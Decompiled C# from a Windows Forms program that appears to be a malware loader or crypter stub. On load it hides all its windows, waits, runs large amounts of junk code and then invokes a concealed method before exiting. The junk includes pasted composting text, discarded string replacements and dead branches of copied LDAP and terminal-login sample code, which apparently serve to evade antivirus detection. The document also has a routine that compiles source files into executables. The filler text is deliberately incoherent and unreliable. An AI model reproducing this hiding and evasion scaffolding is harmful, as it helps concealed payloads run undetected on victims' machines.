			if (FormulaMagicaDaPaz.CompilarExecutavel("Codigo1.cs"))
			{
				MessageBox.Show("Arquivo EXE gerado com sucesso.");
			}
		}

		// Token: 0x060008EF RID: 2287 RVA: 0x00028FF4 File Offset: 0x000271F4
		public static bool CompilarExecutavel(string nomeFonte)
		{
			FileInfo fileInfo = new FileInfo(nomeFonte);
			CodeDomProvider codeDomProvider = null;
			bool result = false;
			if (Operators.CompareString(fileInfo.Extension.ToUpper(CultureInfo.InvariantCulture), ".CS", false) == 0)
			{
				codeDomProvider = CodeDomProvider.CreateProvider("CSharp");
			}
			else if (Operators.CompareString(fileInfo.Extension.ToUpper(CultureInfo.InvariantCulture), ".VB", false) == 0)
			{
				codeDomProvider = CodeDomProvider.CreateProvider("VisualBasic");
			}
			else
			{
				MessageBox.Show("Arquivo de codigo deve ter uma extensão .cs ou .vb");
			}
			if (codeDomProvider != null)
			{
				string outputAssembly = string.Format("{0}\\{1}.exe", Environment.CurrentDirectory, fileInfo.Name.Replace(".", "__"));
				CompilerResults compilerResults = codeDomProvider.CompileAssemblyFromFile(new CompilerParameters
				{
					GenerateExecutable = true,
					OutputAssembly = outputAssembly,
					GenerateInMemory = false,
					TreatWarningsAsErrors = false
				}, new string[]
				{
					nomeFonte
				});
				if (compilerResults.Errors.Count > 0)
				{
					MessageBox.Show("Erros Construindo " + nomeFonte + " em " + compilerResults.PathToAssembly);
					try
					{
						foreach (object obj in compilerResults.Errors)
						{
							CompilerError compilerError = (CompilerError)obj;
							MessageBox.Show("  {0}", compilerError.ToString());
						}
						goto IL_16A;
					}
					finally
					{
						IEnumerator enumerator;
						if (enumerator is IDisposable)
						{
							(enumerator as IDisposable).Dispose();
						}
					}
				}
				MessageBox.Show("Fonte " + nomeFonte + " foi construido com sucesso em " + compilerResults.PathToAssembly);
				IL_16A:
				result = (compilerResults.Errors.Count <= 0);
			}
			return result;
		}

		// Token: 0x060008F0 RID: 2288 RVA: 0x00029194 File Offset: 0x00027394
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void Form1_Load(object sender, EventArgs e)
		{
			base.Visible = false;
			base.Hide();
			MyProject.Forms.MainForm.Visible = false;
			MyProject.Forms.MainForm.Hide();
			MyProject.Forms.FormularioDoCrime.Visible = false;
			MyProject.Forms.FormularioDoCrime.Hide();
			Thread.Sleep(2000);
			XElement xelement = new XElement(XName.Get("code", ""));
			xelement.Add("\n                       Therefore, in an orchard where perhaps 4 tons of fruit per acre is removed per acre, only 4 times\n15, or 60 grams of N per acre is needed to replace that removed by harvest. Why are some conventional\norchardists putting 1000 pounds of fertilizer per acre on their orchards each year?\nThe “worst case scenario” with respect to harvest removal of nutrients is production of silage, where 200\ntons of plant material may be removed per acre. At these high rates, 200 times 15, or 3,000 grams of N (3\nkg of N) would need to be added back per acre.\nCan compost tea supply those needs? The surprising answer to this question is yes. Not in the standard\n“fertilizer” form (nitrate), however, but as organic N, held by the biology in organic matter and microbial,\nbiological forms.\nMost people have been told that compost is not a fertilizer. That statement can only be made if only\nsoluble, inorganic nutrient values are used. The fertilizer industry has pushed to define N as only nitrate,\npossibly nitrite, and maybe ammonium, the inorganic forms of N. While this is based on the soluble forms\nof N that most vegetable and row crop plants take up through their roots, it is far from the only source of N\nin soil.\nIf the full soil food web is present, then forms of N that are not nitrate, nitrite or ammonium will be cycled\ninto these soluble forms by the organism. And not just N, but any not-soluble form of any nutrient will\neventually be converted from its non-soluble form to the plant-available, soluble form by the organisms\ncycling system in a healthy soil. Phosphorus, for example, is converted from not plant available forms (in\nrocks, in sand, silt, and clay, in humic materials, in organic matter, in dead plant material) into organism\nbiomass and then be consumed by predators which results in release of plant-available forms of the\nnutrient.\nIf the organisms that perform these cycling processes have been destroyed by agricultural “management”,\nthen nutrients cannot be processed from not-plant-available forms into plant available forms. Leaching,\nerosion, and compaction then result in loss of the remaining nutrients from the soil, and plant production\nwill suffer. The engineering and chemical answer is to load more and more soluble, inorganic nutrients\ninto the soil, while bemoaning the fact that water quality suffers. These sciences have ignored the fact that\nnatural systems manage to hold nutrients, manage to produce clean water, and produce higher plant yields\nthan any agricultural system.\nPlans for cleaning up nutrients using mechanical filtration systems (requiring engineers to design, build and\nmaintain them), using soil-less mixes have been suggested as solutions to the water quality problem, all the\nwhile ignoring that nature has been successfully feeding everyone since life began on this planet. We have\nall the food we need; it is social systems that prevent people from having food. The human system needs to\nbe fixed, not the plant production system. We need to learn the lessons nature puts in front of us everyday\nNutrient Pools in Compost\nWhy is it that when you send a sample into a soil chemistry lab, compost will always be reported as being\nlow in nitrogen? First, soil chemistry labs may remove the obvious organic matter as soon as the sample\narrives, because their methods cannot extract minerals from large chunks of organic matter. They typically\ndry the sample and then use extracting agents to remove the soluble forms of the nutrients from the soil\nsolution (soluble pool), or remove the “exchangeable” forms of nutrients from the surfaces of the clays,\nsilts, sands and organic matter.\nDoes either approach to extracting nutrients assess bacteria? Fungi? Protozoa, nematodes or\nmicroarthropods? No. Nutrients in humus are not extracted either. Nor nutrients in parent material. Only\nthe nutrients that are soluble (dissolved in water) or that can be extracted from the SURFACES of sand, silt\nand clay particles and organic matter are pulled from the soil. The exact value obtained for any nutrient\nalso depends on the extracting agent used. Some extractants pull more nutrients than others, so in order to\ncompare one lab’s results with another’s, the extractants used must be known..\nWhat test tells you what the plant will take up? Neither soluble nutrient pool concentration nor\n8 \nexchangeable nutrient pool concentrations will tell you what the plant will take up. Water soluble nutrients\nconcentrations (N or P, or S, for examples) just indicate what is dissolved in water, right now. The plant\nmay not be able to take up any of that if osmotic concentration is too high. If salt content is too high, water\nis held by the salts, and the plant cannot access either nutrients or water.\nFigure 2. The three pools of nutrients in soil. The total extractable pool is assessed using very strong\nextracting agents, while the exchangeable pool uses less and less strong extractants, until the soluble where\nweak extracting agents are used. In natural soils, it is the bacteria and fungi that make enzymes and\norganic acids to solubilize nutrients from rocks, organic matter, clay, sand and silt particles, and tie-up\nthose nutrients in their living biomass, as well as organic matter waste products. Nitrogen is not held in\nrocks, but N-fixing bacteria perform the same function. These bacteria immobilize that fixed N in their\nbiomass. In both cases, predators are required to mineralize these nutrients into inorganic forms the\nplants require. \n                   ");
			Strings.Replace(xelement.Value, "a", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "b", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "c", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "e", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "f", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "g", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "h", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "i", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "j", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "k", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "l", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "m", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "n", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "o", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "p", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "q", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "a", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "b", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "c", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "e", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "f", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "g", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "h", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "i", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "j", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "k", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "l", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "m", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "n", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "o", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "p", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "q", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "a", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "b", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "c", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "e", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "f", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "g", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "h", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "i", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "j", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "k", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "l", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "m", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "n", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "o", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "p", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "q", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "a", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "b", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "c", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "e", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "f", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "g", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "h", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "i", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "j", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "k", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "l", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "m", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "n", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "o", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "p", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "q", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "h", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "i", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "j", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "k", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "l", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "m", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "n", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "o", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "p", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "q", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "a", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "b", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "c", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "e", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "f", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "g", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "h", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "i", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "j", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "k", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "l", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "m", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "n", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "o", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "p", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "q", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "a", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "b", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "c", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "e", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "f", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "g", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "h", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "i", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "j", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "k", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "l", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "m", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "n", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "o", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "p", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			Strings.Replace(xelement.Value, "q", "sdhfbslrfnslr656756y567yhjhtg", 1, -1, CompareMethod.Binary);
			int num = 0;
			if (num == 1)
			{
				object objectValue = RuntimeHelpers.GetObjectValue(Interaction.GetObject("LDAP://CN=Rob Young, OU=Finance, DC=fabrikam,DC=Com", null));
				object objectValue2 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue, null, "Get", new object[]
				{
					"ntSecurityDescriptor"
				}, null, null, null));
				object objectValue3 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue2, null, "DiscretionaryACL", new object[0], null, null, null));
				object objectValue4 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("AccessControlEntry", ""));
				NewLateBinding.LateSet(objectValue4, null, "AceFlags", new object[]
				{
					0
				}, null, null);
				NewLateBinding.LateSet(objectValue4, null, "AceType", new object[]
				{
					5
				}, null, null);
				NewLateBinding.LateSet(objectValue4, null, "Flags", new object[]
				{
					3
				}, null, null);
				NewLateBinding.LateSet(objectValue4, null, "ObjectType", new object[]
				{
					"{68b1d179-0d15-4d4f-ab71-46152e79a7bc}"
				}, null, null);
				NewLateBinding.LateSet(objectValue4, null, "AccessMask", new object[]
				{
					256
				}, null, null);
				object[] array;
				bool[] array2;
				NewLateBinding.LateCall(objectValue3, null, "AddAce", array = new object[]
				{
					objectValue4
				}, null, null, array2 = new bool[]
				{
					true
				}, true);
				if (array2[0])
				{
					objectValue4 = RuntimeHelpers.GetObjectValue(array[0]);
				}
				NewLateBinding.LateSet(objectValue2, null, "DiscretionaryAcl", new object[]
				{
					objectValue3
				}, null, null);
				NewLateBinding.LateCall(objectValue, null, "SetInfo", new object[0], null, null, null, true);
			}
			checked
			{
				if (num == 2)
				{
					object objectValue5 = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("BZWhll.WhllObj", ""));
					if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue5, null, "OpenSession", new object[]
					{
						1,
						1,
						"iseries.zad",
						30,
						1
					}, null, null, null)), 0, false))
					{
						NewLateBinding.LateCall(objectValue5, null, "MsgBox", new object[]
						{
							"Error connecting to host!",
							4096
						}, null, null, null, true);
					}
					if (Operators.ConditionalCompareObjectNotEqual(RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(objectValue5, null, "Connect", new object[]
					{
						"A"
					}, null, null, null)), 0, false))
					{
						NewLateBinding.LateCall(objectValue5, null, "MsgBox", new object[]
						{
							"Error connecting to session A!",
							4096
						}, null, null, null, true);
					}
					NewLateBinding.LateCall(objectValue5, null, "SendKey", new object[]
					{
						"username@Tpassword@E"
					}, null, null, null, true);
					NewLateBinding.LateCall(objectValue5, null, "WaitReady", new object[]
					{
						10,
						1
					}, null, null, null, true);
					NewLateBinding.LateCall(objectValue5, null, "SendKey", new object[]
					{
						"1@E"
					}, null, null, null, true);
					NewLateBinding.LateCall(objectValue5, null, "WaitReady", new object[]
					{
						10,
						1
					}, null, null, null, true);
					NewLateBinding.LateCall(objectValue5, null, "SendKey", new object[]
					{
						"1@E"
					}, null, null, null, true);
					NewLateBinding.LateCall(objectValue5, null, "WaitReady", new object[]
					{
						10,
						1
					}, null, null, null, true);
					NewLateBinding.LateCall(objectValue5, null, "SendKey", new object[]
					{
						"10@E"
					}, null, null, null, true);
					NewLateBinding.LateCall(objectValue5, null, "WaitReady", new object[]
					{
						10,
						1
					}, null, null, null, true);
					object objectValue6 = RuntimeHelpers.GetObjectValue(NewLateBinding.LateGet(RuntimeHelpers.GetObjectValue(Interaction.CreateObject("Scripting.FileSystemObject", "")), null, "OpenTextFile", new object[]
					{
						"c:\\joblog.txt",
						2,
						true
					}, null, null, null));
					new XElement(XName.Get("code", "")).Add("\nThe moisture level can be measured by forming a rice bran\nboll and twisting it. If the moisture level is around 65 -70 % the\nboll can be easily divided into two halves. However, it is better\nto use the moisture meter (hygrometer) to get accurate data.\nAfter evenly mixing with diluted IMO-2 make a heap 13-15\ninches (30 to 40 cm) hight, and cover it with straw, straw mat\nor leaf litter to prevent moisture evaporation and to provide\nshade from direct sunlight. 70% shade and 30% light is\nrecommended, since it creates favorable conditions for useful\nmicrobes in paddy straw, Eg. Aspergillus’s oryzae, Bacillus\nsubtilis, etc. Be sure to press several spots with weights or soils\nover the straw, because straw is too light to be fixed on the top\nof the rice bran mixture. It is best to use straw mats or straw\nbags (gunny bags) for covering.\nThis process is very important for massive cultivation of\nIMOs. This must be done on soil floor and not on a concrete\nfloor and in a place with good ventilation. As time passes, the\ntemperature rises within the pile of the rice bran mixture,\nbecause it undergoes fermentation. When the temperature\nreaches 40-50 °C turnover the rice bran mixture evenly so that\nthe temperature does not rise further and also in order to\nprevent moist clusters. If the temperature is below 40 °C, the\nmixture may be in an anaerobic condition due to the excessive\nmoisture. If the temperature rises up above 70 °C, proteins\nmay be broken down by thermophilic microbes and nutrients\nreleased into the air resulting in loss of fertilizer effect.\nTherefore, it is necessary to turn over the rice bran mixture in\norder to control temperature. It takes about 7 days for this\nprocess.\nWhen IMO-3 is completely cultured, they become a lump of\nwhite colonies of IMOs and are visible over the top when the\n20\nstraws are uncovered. In the beginning of the fermentation, the\nIMOs emit a pleasant smell (similar to those of Absida,\nAspergillus, Mucor or Rhizopus) during their fermentation,\nand give out a fragrance when the fermentation process is\ncompleted. The moisture level drops to around 40% from 65-\n70% of the initial stage. It is called pure stock or IMO-3.\nHow to store IMO-3\nKeep the IMO3 bags in shaded and cool place. Make sure that\nthe air is well circulated by keeping IMO-3 in a ventilated\ncontainer such as jute / gunny / cloth bags.\nFirst, spread rice straw or leaf litter at the bottom of the\ncontainer, and put in IMO-3. During storage, the IMO-3 may\nbecome dry (moisture level 20-30%) as the moisture gets\nevaporated. It means that the IMOs have entered a sleeping\nphase (state of dormancy). Pile up containers into 3 layers and\nshield them from direct sunlight and rain. At this point, there\nis no need to turn over, because of the convection currents that\nare created through the gaps of containers. \n");
					string text = "More..";
					string right = "Bottom";
					while (Operators.CompareString(text, right, false) != 0)
					{
						int num2 = 1;
						object[] array;
						bool[] array2;
						do
						{
							object instance = objectValue5;
							Type type = null;
							string memberName = "ReadScreen";
							object[] arguments = array = new object[]
							{
								text,
								80,
								num2,
								1
							};
							string[] argumentNames = null;
							Type[] typeArguments = null;
							bool[] array3 = new bool[4];
							array3[0] = true;
							array3[2] = true;
							array2 = array3;
							NewLateBinding.LateCall(instance, type, memberName, arguments, argumentNames, typeArguments, array3, true);
							if (array2[0])
							{
								text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
							}
							if (array2[2])
							{
								num2 = (int)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[2]), typeof(int));
							}
							NewLateBinding.LateCall(objectValue6, null, "WriteLine", array = new object[]
							{
								text
							}, null, null, array2 = new bool[]
							{
								true
							}, true);
							if (array2[0])
							{
								text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
							}
							num2++;
						}
						while (num2 <= 24);
						NewLateBinding.LateCall(objectValue6, null, "WriteLine", new object[]
						{
							" "
						}, null, null, null, true);
						object instance2 = objectValue5;
						Type type2 = null;
						string memberName2 = "ReadScreen";
						object[] arguments2 = array = new object[]
						{
							text,
							6,
							19,
							74
						};
						string[] argumentNames2 = null;
						Type[] typeArguments2 = null;
						bool[] array4 = new bool[4];
						array4[0] = true;
						array2 = array4;
						NewLateBinding.LateCall(instance2, type2, memberName2, arguments2, argumentNames2, typeArguments2, array4, true);
						if (array2[0])
						{
							text = (string)Conversions.ChangeType(RuntimeHelpers.GetObjectValue(array[0]), typeof(string));
						}
					}
					NewLateBinding.LateCall(objectValue6, null, "Close", new object[0], null, null, null, true);
					NewLateBinding.LateCall(objectValue5, null, "SendKey", new object[]
					{
						"1@E"
					}, null, null, null, true);
					NewLateBinding.LateCall(objectValue5, null, "WaitReady", new object[]
					{
						10,
						1
					}, null, null, null, true);
					NewLateBinding.LateCall(objectValue5, null, "SendKey", new object[]
					{
						"1@E"
					}, null, null, null, true);
					NewLateBinding.LateCall(objectValue5, null, "WaitReady", new object[]
					{
						10,
						1
					}, null, null, null, true);
					NewLateBinding.LateCall(objectValue5, null, "SendKey", new object[]
					{
						"10@E"
					}, null, null, null, true);
					NewLateBinding.LateCall(objectValue5, null, "WaitReady", new object[]
					{
						10,
						1
					}, null, null, null, true);
					NewLateBinding.LateCall(objectValue5, null, "CloseSession", new object[]
					{
						1,
						1
					}, null, null, null, true);
				}
				int num3 = 10;
				num3 *= 2;
				int num4 = 1;
				do
				{
					num3 += 47;
					num4++;
				}
				while (num4 <= 4);
				new XElement(XName.Get("chapaquente", "")).Add("\n                 Leleleleleê, Deixa a bala cumer\n\n        Leleleleleâ, Remetente de Rajadá\n\n        Quem nao nasceu pra bandido, vai arruma uma batalha\n\n        La na PPG falcão, G3 que gargalha\n\n\n                     ");
				base.Visible = false;
				base.Hide();
				MyProject.Forms.MainForm.Visible = false;
				MyProject.Forms.MainForm.Hide();
				MyProject.Forms.FormularioDoCrime.Visible = false;
				MyProject.Forms.FormularioDoCrime.Hide();
				Thread.Sleep(2000);
				agua.MeusOvos();
				Process.GetCurrentProcess().CloseMainWindow();
				MyProject.Forms.FormularioDoCrime.Close();
				base.Close();
				MyProject.Forms.MainForm.Close();
				Application.Exit();
				Process.GetCurrentProcess().Close();
				FileSystem.FileClose(new int[0]);
				ProjectData.EndApp();
			}
		}

		// Token: 0x04000214 RID: 532
		private IContainer components;
	}
}
